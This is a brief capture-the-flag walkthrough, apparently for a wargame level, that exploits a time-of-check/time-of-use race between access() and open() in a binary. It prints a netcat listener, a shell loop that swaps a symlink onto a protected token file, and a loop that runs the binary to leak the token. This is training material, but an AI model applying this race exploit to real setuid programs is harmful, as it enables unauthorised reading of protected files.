When we execute the binary, it ask for a connection on port 6969

with cutter we examined the binary and saw an access function call

we checked for vulnerabilities and found one, if access passed it calls open but there is a little delay.

The trick is to switch with a symbolic link from a trash file where we have rights to the token file between this delay

To do this, we make an infinite loop that keep switching the symbolic links between the token and the trash file in order to exploit the vulnerability

First make a terminal listening on port 6969 `nc -lk 6969`

Then exec the script
```
#!/bin/sh

new=`ls -l to_read`
old=`ls -l to_read`

while [ "$new" = "$old" ]
do
	ln -fs useless_file symlink
	ln -fs ~/token symlink
	new=`ls -l to_read`
done
```

and to finish, you can run the binary in a loop `while true; do ./level10 /tmp/level10/symlink 127.0.0.1; done`
